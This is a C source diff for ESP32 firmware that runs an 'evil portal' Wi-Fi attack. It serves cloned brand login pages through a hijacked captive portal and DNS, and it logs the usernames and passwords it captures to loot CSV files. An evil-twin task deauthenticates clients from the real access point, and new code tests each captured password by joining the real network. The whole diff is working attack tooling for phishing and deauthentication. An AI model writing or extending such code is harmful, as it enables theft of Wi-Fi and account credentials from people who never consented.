@@ -46,6 +46,7 @@
 #include "nvs.h"                 // persist the opt-in SD diagnostics flag across reboots
 #include "nucleo_arb.h"         // heavy-work arbiter: ONE TLS/network job at a time (vs ANIMA online)
 #include "nucleo_evilportal_clone.h"   // pure HTML asset rewriter (F2 fidelity)
+#include "nucleo_evilportal_redact.h"  // pure loot password redactor (full/mask/hidden/length)
 #include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below
 
 // Restore the saved network on stop (resolved at link; nucleo_setup REQUIRES nucleo_app, so a
@@ -149,7 +150,19 @@ static void build_ssid_presets(void)
 
 // ---- runtime state ----------------------------------------------------------
 static volatile bool s_running;
+static char s_gw[16] = PORTAL_IP;   // active captive gateway/AP IP; operator-selectable before arm (#7)
 static volatile bool s_dhcps_ok;    // did the AP DHCP server actually come up? false -> clients stall on "Gathering IP"
+
+// ---- captured-password verification state (#1) — declared here so capture() (above the twin section)
+// can queue a candidate PSK. The verify task + twin_is_verifiable() are defined down in the twin block.
+static volatile bool s_verify_on;              // operator opt-in (honored only for twin + encrypted)
+static volatile bool s_verify_run;             // verify task alive
+static volatile bool s_verify_req;             // a candidate PSK is waiting in s_verify_pass
+static volatile bool s_verify_busy;            // a join attempt is in flight
+static volatile int  s_valid, s_invalid;       // outcome counters for the session
+static char          s_verify_pass[64];        // the candidate PSK to try next
+static TaskHandle_t  s_verify_task;
+static bool          twin_is_verifiable(void); // fwd decl: capture() gates on it
 static bool s_ap_netif_created;     // true when WE created the default AP netif (STA-only boot had none); torn down on stop
 static volatile bool s_dns_run;
 static TaskHandle_t   s_dns_task;
@@ -229,34 +242,74 @@ static void rate_tick_locked(void)
 }
 
 // ---- SD template enumeration ------------------------------------------------
-// Returns the Nth *.html filename (without path) in PORTAL_TPL into `out`; false if none.
-static bool sd_template_name(int n, char *out, int outsz)
+// The portal pool is the built-in fallback plus every *.html under /sd/evilportal/portals/. To let
+// an operator keep brand clones grouped by language (Bruce ships portals/en, portals/pt-br, ...), we
+// enumerate flat files FIRST, then descend ONE level into each immediate subdirectory and yield its
+// *.html as "<dir>/<file>" (e.g. "en/facebook.html"). The cloned-asset mirror "a/" is skipped. The
+// yielded path is relative to PORTAL_TPL, so load_template's "PORTAL_TPL/<relpath>" resolves either
+// a flat file or a subfoldered one unchanged. Ordering is the FS readdir order and is stable within a
+// session (count/name/path all walk the same way), which is all the selection UI needs.
+static bool ent_is_html(const char *name)
 {
-    DIR *dp = opendir(PORTAL_TPL);
-    if (!dp) return false;
-    struct dirent *e; int i = 0; bool got = false;
-    while ((e = readdir(dp))) {
-        const char *dot = strrchr(e->d_name, '.');
-        if (!dot || strcasecmp(dot, ".html") != 0) continue;
-        if (i == n) { snprintf(out, outsz, "%s", e->d_name); got = true; break; }
-        i++;
-    }
-    closedir(dp);
-    return got;
+    const char *dot = strrchr(name, '.');
+    return dot && strcasecmp(dot, ".html") == 0;
+}
+static bool ent_is_dir(const char *parent, const struct dirent *e)
+{
+#ifdef DT_DIR
+    if (e->d_type == DT_DIR) return true;
+    if (e->d_type != DT_UNKNOWN) return false;
+#endif
+    char p[192]; snprintf(p, sizeof p, "%s/%s", parent, e->d_name);
+    struct stat st; return stat(p, &st) == 0 && S_ISDIR(st.st_mode);
 }
 
-static int sd_template_count(void)
+// Walk the pool. Returns the total SD template count. When want>=0 and in range, writes that entry's
+// path (relative to PORTAL_TPL) into out and stops.
+static int sd_template_walk(int want, char *out, int outsz)
 {
+    int i = 0;
     DIR *dp = opendir(PORTAL_TPL);
     if (!dp) return 0;
-    struct dirent *e; int i = 0;
+    // Pass A: flat *.html directly in PORTAL_TPL.
+    struct dirent *e;
     while ((e = readdir(dp))) {
-        const char *dot = strrchr(e->d_name, '.');
-        if (dot && strcasecmp(dot, ".html") == 0) i++;
+        if (e->d_name[0] == '.') continue;
+        if (ent_is_dir(PORTAL_TPL, e)) continue;
+        if (!ent_is_html(e->d_name)) continue;
+        if (i == want && out) { snprintf(out, outsz, "%s", e->d_name); closedir(dp); return i + 1; }
+        i++;
+    }
+    rewinddir(dp);
+    // Pass B: *.html one level deep, as "<subdir>/<file>" (skip the "a" cloned-asset mirror).
+    while ((e = readdir(dp))) {
+        if (e->d_name[0] == '.') continue;
+        if (!strcmp(e->d_name, "a")) continue;
+        if (!ent_is_dir(PORTAL_TPL, e)) continue;
+        char sub[192]; snprintf(sub, sizeof sub, "%s/%s", PORTAL_TPL, e->d_name);
+        DIR *sp = opendir(sub);
+        if (!sp) continue;
+        struct dirent *se;
+        while ((se = readdir(sp))) {
+            if (se->d_name[0] == '.' || !ent_is_html(se->d_name)) continue;
+            if (i == want && out) { snprintf(out, outsz, "%s/%s", e->d_name, se->d_name); closedir(sp); closedir(dp); return i + 1; }
+            i++;
+        }
+        closedir(sp);
     }
     closedir(dp);
     return i;
 }
+
+static bool sd_template_name(int n, char *out, int outsz)
+{
+    if (n < 0 || outsz <= 0) return false;
+    out[0] = 0;                          // walk writes out only when n is in range
+    sd_template_walk(n, out, outsz);
+    return out[0] != 0;
+}
+
+static int sd_template_count(void) { return sd_template_walk(-1, NULL, 0); }
 
 int nucleo_evilportal_template_count(void) { return N_BUILTIN + sd_template_count(); }
 
@@ -373,7 +426,9 @@ static void timestamp(char *out, int sz)
 // nucleo_evilportal_set_debug(). Best-effort: no SD -> silent no-op; must never affect the start path.
 #define EP_NVS_NS   "evilportal"
 #define EP_NVS_DBG  "dbg"
+#define EP_NVS_PWD  "pwdmode"
 static int8_t s_ep_debug = -1;   // -1 = not yet loaded from NVS; 0 = off; 1 = on
+static int8_t s_pwd_mode = -1;   // -1 = not yet loaded from NVS; else EP_PWD_*
 
 static bool ep_debug_on(void)
 {
@@ -415,6 +470,71 @@ void nucleo_evilportal_set_debug(bool on)
 
 bool nucleo_evilportal_debug(void) { return ep_debug_on(); }
 
+// ---- loot password redaction mode (NVS-persisted) --------------------------
+static int pwd_mode(void)
+{
+    if (s_pwd_mode < 0) {                                  // lazy load on first use
+        s_pwd_mode = EP_PWD_FULL;
+        nvs_handle_t h;
+        if (nvs_open(EP_NVS_NS, NVS_READONLY, &h) == ESP_OK) {
+            uint8_t v = 0;
+            if (nvs_get_u8(h, EP_NVS_PWD, &v) == ESP_OK && v < EP_PWD_MODE_N) s_pwd_mode = (int8_t)v;
+            nvs_close(h);
+        }
+    }
+    return s_pwd_mode;
+}
+
+void nucleo_evilportal_set_pwd_mode(int mode)
+{
+    if (mode < 0 || mode >= EP_PWD_MODE_N) mode = EP_PWD_FULL;
+    s_pwd_mode = (int8_t)mode;
+    nvs_handle_t h;
+    if (nvs_open(EP_NVS_NS, NVS_READWRITE, &h) == ESP_OK) {
+        nvs_set_u8(h, EP_NVS_PWD, (uint8_t)mode);
+        nvs_commit(h);
+        nvs_close(h);
+    }
+}
+
+int nucleo_evilportal_pwd_mode(void) { return pwd_mode(); }
+
+// ---- selectable captive gateway/AP IP (#7) ---------------------------------
+// The whole captive stack (AP IP, DHCP DNS offer, the hand-rolled DNS A-answer, the login/redirect
+// URLs and the RFC 8910 opt-114 URI) uses s_gw. 192.168.4.1 is the default; 172.0.0.1 is the common
+// alternative some gateways use. Set BEFORE arming; a no-op while running (the subnet can't change
+// under live clients). `ip` must be a dotted IPv4 quad; anything else is ignored.
+static bool valid_ipv4(const char *s)
+{
+    if (!s) return false;
+    int parts = 0;
+    for (; parts < 4; parts++) {
+        if (!isdigit((unsigned char)*s)) return false;
+        int v = 0, d = 0;
+        while (isdigit((unsigned char)*s)) { v = v * 10 + (*s++ - '0'); if (++d > 3 || v > 255) return false; }
+        if (parts < 3) { if (*s != '.') return false; s++; }
+    }
+    return *s == 0;
+}
+
+void nucleo_evilportal_set_gateway(const char *ip)
+{
+    if (s_running || !valid_ipv4(ip)) return;
+    snprintf(s_gw, sizeof s_gw, "%s", ip);
+}
+
+const char *nucleo_evilportal_gateway(void) { return s_gw; }
+
+const char *nucleo_evilportal_pwd_mode_name(int mode)
+{
+    switch (mode) {
+        case EP_PWD_MASK: return "masked";
+        case EP_PWD_HIDE: return "hidden";
+        case EP_PWD_LEN:  return "length";
+        default:          return "full";
+    }
+}
+
 // Record this client's password attempt. Returns the attempt count (1 = first this client sends)
 // and, for a repeat, whether the password equals what they sent before.
 static int seen_note(const char *ip, const char *pass, bool *match)
@@ -442,20 +562,27 @@ static int capture(const char *client_ip, char *body)
 {
     char ts[40]; timestamp(ts, sizeof ts);
     char user[96] = "", pass[96] = "", raw[512] = "";
+    const int md = pwd_mode();           // loot redaction mode, resolved once for this capture
 
-    // Build a compact raw "k=v; k=v" trail and pull out user/pass while decoding in place.
+    // Build a compact raw "k=v; k=v" trail and pull out user/pass while decoding in place. When a
+    // non-full redaction mode is active, the value of any PASSWORD field is redacted before it lands
+    // in `raw` too — otherwise the cleartext would leak through the raw column the UI/CSV preserves.
     char *save = NULL;
     for (char *kv = strtok_r(body, "&", &save); kv; kv = strtok_r(NULL, "&", &save)) {
         char *eq = strchr(kv, '='); if (!eq) continue;
         *eq = 0; char *k = kv, *v = eq + 1;
         url_decode(k); url_decode(v);
-        if (raw[0] && strlen(raw) + strlen(k) + strlen(v) + 3 < sizeof raw) strncat(raw, "; ", sizeof raw - strlen(raw) - 1);
-        if (strlen(raw) + strlen(k) + strlen(v) + 2 < sizeof raw) { strncat(raw, k, sizeof raw - strlen(raw) - 1); strncat(raw, "=", sizeof raw - strlen(raw) - 1); strncat(raw, v, sizeof raw - strlen(raw) - 1); }
+        char vred[96];
+        const char *vraw = v;
+        if (md != EP_PWD_FULL && is_pass_key(k)) { ep_redact_pass(v, md, vred, sizeof vred); vraw = vred; }
+        if (raw[0] && strlen(raw) + strlen(k) + strlen(vraw) + 3 < sizeof raw) strncat(raw, "; ", sizeof raw - strlen(raw) - 1);
+        if (strlen(raw) + strlen(k) + strlen(vraw) + 2 < sizeof raw) { strncat(raw, k, sizeof raw - strlen(raw) - 1); strncat(raw, "=", sizeof raw - strlen(raw) - 1); strncat(raw, vraw, sizeof raw - strlen(raw) - 1); }
         if (!pass[0] && is_pass_key(k)) snprintf(pass, sizeof pass, "%s", v);
         else if (!user[0] && is_user_key(k)) snprintf(user, sizeof user, "%s", v);
     }
 
     // Confirmation pass: re-prompt the first attempt, flag a matching re-entry as high-confidence.
+    // seen_note compares the RAW secret, so confirm-match is unaffected by the redaction mode below.
     int  attempt = 2;                    // forms with no password (email-only) skip the re-prompt
     bool confirmed = false;
     if (pass[0]) {
@@ -463,6 +590,19 @@ static int capture(const char *client_ip, char *body)
         attempt = seen_note(client_ip, pass, &match);
         if (attempt >= 2 && match) { confirmed = true; s_confirmed++; }
     }
+
+    // #1: hand the raw candidate PSK to the verify task (twin + encrypted real AP only; non-blocking —
+    // the join runs off this httpd task so the portal keeps serving). One attempt in flight at a time.
+    if (pass[0] && twin_is_verifiable() && !s_verify_busy && !s_verify_req) {
+        snprintf(s_verify_pass, sizeof s_verify_pass, "%s", pass);
+        s_verify_req = true;
+    }
+
+    // Redact the secret for the two loot sinks and the live UI per the operator's chosen mode (Bruce
+    // parity: full / masked / hidden / length-only). The RAW `pass` above is never persisted once a
+    // non-full mode is set; everything downstream uses `pass` only through `pass_red`.
+    char pass_red[96];
+    ep_redact_pass(pass, md, pass_red, sizeof pass_red);
 
     // Two sinks: the per-session loot file and a cumulative all-credentials.csv (header once).
     FILE *all = fopen(LOOT_ALL, "rb"); bool need_hdr = (all == NULL); if (all) fclose(all);
@@ -472,15 +612,15 @@ static int capture(const char *client_ip, char *body)
         FILE *f = pass2 ? fs : fa; if (!f) continue;
         if (pass2 == 0 && need_hdr) fprintf(f, "timestamp,ssid,client,user,password,confirmed,raw\n");
         csv_field(f, ts, false); csv_field(f, s_ep->cur_ssid, false); csv_field(f, client_ip, false);
-        csv_field(f, user, false); csv_field(f, pass, false);
+        csv_field(f, user, false); csv_field(f, pass_red, false);
         csv_field(f, confirmed ? "yes" : "no", false); csv_field(f, raw, true);
     }
     if (fa) { fclose(fa); }
     if (fs) { fclose(fs); }
 
     char lu[96], lp[96];                 // format outside the lock; keep the critical section tiny
-    snprintf(lu, sizeof lu, "%s", user[0] ? user : raw);
-    snprintf(lp, sizeof lp, "%s", pass);
+    snprintf(lu, sizeof lu, "%s", user[0] ? user : raw);   // raw here is already pass-redacted above
+    snprintf(lp, sizeof lp, "%s", pass_red);               // live UI shows the redacted secret too
     taskENTER_CRITICAL(&s_mux);
     memcpy(s_ep->last_user, lu, sizeof s_ep->last_user);
     memcpy(s_ep->last_pass, lp, sizeof s_ep->last_pass);
@@ -523,7 +663,8 @@ static void serve_login(httpd_req_t *req, bool with_error)
     httpd_resp_set_type(req, "text/html; charset=utf-8");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
     httpd_resp_set_hdr(req, "Captive-Portal", "true");           // RFC 8908
-    httpd_resp_set_hdr(req, "X-WiFi-Login-URL", "http://" PORTAL_IP "/");
+    char login_url[32]; snprintf(login_url, sizeof login_url, "http://%s/", s_gw);   // valid until this response is sent
+    httpd_resp_set_hdr(req, "X-WiFi-Login-URL", login_url);
     const char *html = s_tpl_html ? s_tpl_html : "<h1>Portal</h1>";
     const char *body = with_error ? strstr(html, "<body") : NULL;
     if (body) body = strchr(body, '>');               // end of the <body ...> tag
@@ -579,7 +720,7 @@ static bool handle_off_host(httpd_req_t *req)
 {
     char host[64] = "";
     if (httpd_req_get_hdr_value_str(req, "Host", host, sizeof host) != ESP_OK || !host[0]) return false;
-    if (strncmp(host, PORTAL_IP, strlen(PORTAL_IP)) == 0) return false;   // already on the portal host
+    if (strncmp(host, s_gw, strlen(s_gw)) == 0) return false;   // already on the portal host
     serve_login(req, false);                                              // 200 + HTML + Captive-Portal: true
     return true;
 }
@@ -623,10 +764,10 @@ static void serve_rfc8908(httpd_req_t *req)
     char body[220];
     int n = snprintf(body, sizeof body,
         "{\"captive\":true,"
-        "\"user-portal-url\":\"http://" PORTAL_IP "/\","
-        "\"venue-info-url\":\"http://" PORTAL_IP "/\","
+        "\"user-portal-url\":\"http://%s/\","
+        "\"venue-info-url\":\"http://%s/\","
         "\"can-extend-session\":false,"
-        "\"seconds-remaining\":0}");
+        "\"seconds-remaining\":0}", s_gw, s_gw);
     httpd_resp_set_type(req, "application/captive+json");                 // RFC 8908 media type
     httpd_resp_set_hdr(req, "Cache-Control", "no-store, max-age=0");
     httpd_resp_set_hdr(req, "Captive-Portal", "true");                     // belt + braces
@@ -724,6 +865,11 @@ static void dns_task(void *arg)
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
     if (bind(sock, (struct sockaddr *)&sa, sizeof sa) != 0) { close(sock); s_dns_task = NULL; vTaskDelete(NULL); return; }
 
+    // Resolve the active gateway to 4 octets once (s_gw is fixed for the life of the session). The
+    // A-answer below points every lookup here, so it must match the real AP IP (#7 selectable gw).
+    unsigned go0 = 192, go1 = 168, go2 = 4, go3 = 1;
+    sscanf(s_gw, "%u.%u.%u.%u", &go0, &go1, &go2, &go3);
+
     uint8_t pkt[512];
     while (s_dns_run) {
         struct sockaddr_in src; socklen_t sl = sizeof src;
@@ -740,7 +886,7 @@ static void dns_task(void *arg)
         pkt[o++] = 0x00; pkt[o++] = 0x01;                    // CLASS IN
         pkt[o++] = 0x00; pkt[o++] = 0x00; pkt[o++] = 0x00; pkt[o++] = 0x3C;  // TTL 60
         pkt[o++] = 0x00; pkt[o++] = 0x04;                    // RDLENGTH 4
-        pkt[o++] = 192; pkt[o++] = 168; pkt[o++] = 4; pkt[o++] = 1;          // 192.168.4.1
+        pkt[o++] = (uint8_t)go0; pkt[o++] = (uint8_t)go1; pkt[o++] = (uint8_t)go2; pkt[o++] = (uint8_t)go3;  // the active gateway
         sendto(sock, pkt, o, 0, (struct sockaddr *)&src, sl);
     }
     close(sock);
@@ -764,8 +910,8 @@ static void dns_task(void *arg)
 static void pin_ap_ip(esp_netif_t *ap)
 {
     esp_netif_ip_info_t ip = { 0 };
-    esp_netif_str_to_ip4(PORTAL_IP, &ip.ip);
-    esp_netif_str_to_ip4(PORTAL_IP, &ip.gw);
+    esp_netif_str_to_ip4(s_gw, &ip.ip);
+    esp_netif_str_to_ip4(s_gw, &ip.gw);
     esp_netif_str_to_ip4("255.255.255.0", &ip.netmask);
     esp_netif_set_ip_info(ap, &ip);
 }
@@ -782,7 +928,7 @@ static bool dhcps_apply_once(esp_netif_t *ap, bool skip_opt114)
     esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof offer_dns);
     esp_netif_dns_info_t dns = { 0 };
     dns.ip.type = ESP_IPADDR_TYPE_V4;
-    esp_netif_str_to_ip4(PORTAL_IP, &dns.ip.u_addr.ip4);
+    esp_netif_str_to_ip4(s_gw, &dns.ip.u_addr.ip4);
     esp_netif_set_dns_info(ap, ESP_NETIF_DNS_MAIN, &dns);
 
     // RFC 8910 DHCP option 114 (Captive-Portal URI) is best-effort — and the prime suspect for a
@@ -790,10 +936,11 @@ static bool dhcps_apply_once(esp_netif_t *ap, bool skip_opt114)
     // So we set it only on the FIRST pass; every retry drops it. Captive detection still works
     // without it via the HTTP probe path (generate_204 / hotspot-detect / ncsi served 200+HTML).
     if (!skip_opt114) {
-        static const char CAPTIVE_URI[] = "http://" PORTAL_IP "/api/v1/captive-portal";
+        char captive_uri[64];
+        int cul = snprintf(captive_uri, sizeof captive_uri, "http://%s/api/v1/captive-portal", s_gw);
         ep_dbg("  apply: opt114 SET pre");                                      // TEMP DEBUG
         esp_err_t o114 = esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, 114 /* RFC 8910 */,
-                                     (void*)CAPTIVE_URI, (uint32_t)(sizeof CAPTIVE_URI - 1));
+                                     (void*)captive_uri, (uint32_t)cul);
         ep_dbg("  apply: opt114 SET post rc=%s", esp_err_to_name(o114));        // TEMP DEBUG
     }
 
@@ -953,8 +1100,10 @@ static esp_err_t start_server(void)
 // without saturating our own AP.
 static volatile bool s_twin, s_twin_run;
 static volatile bool s_twin_coherent;          // true = SoftAP brought up matching the real AP's WPA2 (no downgrade tell)
+static volatile bool s_twin_pause;             // #1: deauth paused while a password-verify STA join is in flight
 static uint8_t       s_twin_bssid[6];
 static int           s_twin_channel;
+static int           s_twin_auth;              // real AP's wifi_auth_mode_t (so verify knows it's encrypted)
 static volatile unsigned long s_twin_frames;
 static TaskHandle_t  s_twin_task;
 
@@ -972,12 +1121,83 @@ static void twin_task(void *arg)
 {
     (void)arg;
     while (s_twin_run) {
-        for (int b = 0; b < 6 && s_twin_run; b++) { twin_tx(0xC0); twin_tx(0xA0); }
+        if (s_twin_pause) { vTaskDelay(pdMS_TO_TICKS(100)); continue; }   // hold off while verify owns the STA
+        for (int b = 0; b < 6 && s_twin_run && !s_twin_pause; b++) { twin_tx(0xC0); twin_tx(0xA0); }
         vTaskDelay(pdMS_TO_TICKS(200));                // herd, don't starve our captive AP
     }
     s_twin_task = NULL;
     vTaskDelete(NULL);
 }
+
+// #1 password verify: real AP must be encrypted and non-PMF for an association test to mean anything.
+static bool twin_is_verifiable(void)
+{
+    return s_verify_on && s_twin && s_twin_auth != WIFI_AUTH_OPEN && !auth_is_pmf((wifi_auth_mode_t)s_twin_auth);
+}
+
+// One-shot: try the candidate PSK against the real BSSID. Returns true iff association + IP succeed.
+// Runs ONLY on the verify task. Pauses deauth, flips to APSTA, joins by exact BSSID/channel, waits a
+// bounded time for an IP, then drops STA and restores AP-only. All failure paths restore the radio.
+static bool verify_try_psk(const char *psk)
+{
+    if (!esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"))     // AP-only/solo boot may lack the STA netif
+        esp_netif_create_default_wifi_sta();                 // left for nucleo_setup_apply_network to reconfigure on stop
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta) return false;
+
+    s_twin_pause = true;                                 // stop kicking clients while we associate
+    vTaskDelay(pdMS_TO_TICKS(50));
+
+    wifi_config_t sc = { 0 };
+    snprintf((char *)sc.sta.ssid, sizeof sc.sta.ssid, "%s", s_ep ? s_ep->cur_ssid : "");
+    snprintf((char *)sc.sta.password, sizeof sc.sta.password, "%s", psk);
+    memcpy(sc.sta.bssid, s_twin_bssid, 6);
+    sc.sta.bssid_set = true;
+    sc.sta.channel   = (uint8_t)s_twin_channel;
+    sc.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
+
+    bool ok = false;
+    if (esp_wifi_set_mode(WIFI_MODE_APSTA) == ESP_OK &&
+        esp_wifi_set_config(WIFI_IF_STA, &sc) == ESP_OK) {
+        esp_wifi_connect();
+        esp_netif_ip_info_t ip;
+        for (int i = 0; i < 60 && !ok; i++) {            // up to ~6 s, yielding
+            if (esp_netif_get_ip_info(sta, &ip) == ESP_OK && ip.ip.addr != 0) ok = true;
+            else vTaskDelay(pdMS_TO_TICKS(100));
+        }
+    }
+
+    esp_wifi_disconnect();
+    esp_wifi_set_mode(WIFI_MODE_AP);                     // back to AP-only; the captive AP keeps serving
+    vTaskDelay(pdMS_TO_TICKS(50));
+    s_twin_pause = false;
+    return ok;
+}
+
+static void verify_task(void *arg)
+{
+    (void)arg;
+    while (s_verify_run) {
+        if (s_verify_req) {
+            s_verify_req = false;
+            s_verify_busy = true;
+            char psk[64]; snprintf(psk, sizeof psk, "%s", s_verify_pass);
+            bool ok = verify_try_psk(psk);
+            if (ok) s_valid++; else s_invalid++;
+            ESP_LOGW(TAG, "verify: candidate PSK %s [redacted]", ok ? "VALID" : "rejected");
+            s_verify_busy = false;
+        }
+        vTaskDelay(pdMS_TO_TICKS(150));
+    }
+    s_verify_task = NULL;
+    vTaskDelete(NULL);
+}
+
+void nucleo_evilportal_set_verify(bool on)    { s_verify_on = on; }
+bool nucleo_evilportal_verify_enabled(void)   { return s_verify_on; }
+int  nucleo_evilportal_verified_ok(void)      { return s_valid; }
+int  nucleo_evilportal_verified_bad(void)     { return s_invalid; }
+bool nucleo_evilportal_verifying(void)        { return s_verify_busy; }
 
 static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
                             bool twin, const uint8_t *bssid, wifi_auth_mode_t real_auth, bool coherent)
@@ -990,7 +1210,8 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     s_recent_head = s_recent_total = 0;
     s_confirmed = 0; memset(s_ep->seen, 0, sizeof s_ep->seen); s_seen_head = 0;
     s_start_us = esp_timer_get_time();
-    s_twin = false; s_twin_frames = 0; s_twin_coherent = false;
+    s_twin = false; s_twin_frames = 0; s_twin_coherent = false; s_twin_pause = false;
+    s_valid = 0; s_invalid = 0; s_verify_req = false; s_verify_busy = false; s_twin_auth = WIFI_AUTH_OPEN;
     s_dhcps_ok = false;    // offer_captive_dns() will flip this to true if the DHCP server really started
 
     // Dedicated mode FIRST: free httpd + mDNS + voice + ANIMA L1 (~70KB) so the ~64KB template buffer,
@@ -1045,10 +1266,19 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     if (twin && bssid) {
         memcpy(s_twin_bssid, bssid, 6);
         s_twin_channel = channel;
+        s_twin_auth = (int)real_auth;
         s_twin = true; s_twin_run = true;
         if (xTaskCreate(twin_task, "ep_twin", 2048, NULL, 4, &s_twin_task) != pdPASS) {
             ESP_LOGW(TAG, "twin deauth task failed to start (portal still serves the clone)");
             s_twin_run = false; s_twin = false;
+        }
+        // #1: captured-password verification. Only meaningful against an encrypted, non-PMF real AP.
+        if (twin_is_verifiable()) {
+            s_verify_run = true;
+            if (xTaskCreate(verify_task, "ep_verify", 4096, NULL, 4, &s_verify_task) != pdPASS) {
+                ESP_LOGW(TAG, "verify task failed to start (captures still logged, just not verified)");
+                s_verify_run = false;
+            }
         }
     }
 
@@ -1226,6 +1456,12 @@ void nucleo_evilportal_stop(void)
 {
     if (!s_running) return;
     s_running = false;
+
+    if (s_verify_run) {                    // #1: stop the password-verify task (may be mid-join)
+        s_verify_run = false;
+        for (int i = 0; i < 80 && s_verify_task; i++) vTaskDelay(pdMS_TO_TICKS(25));   // up to ~2 s (a join can be in flight)
+    }
+    s_verify_busy = false; s_verify_req = false; s_twin_pause = false;
 
     if (s_twin_run) {                      // stop the evil-twin deauth task first
         s_twin_run = false;
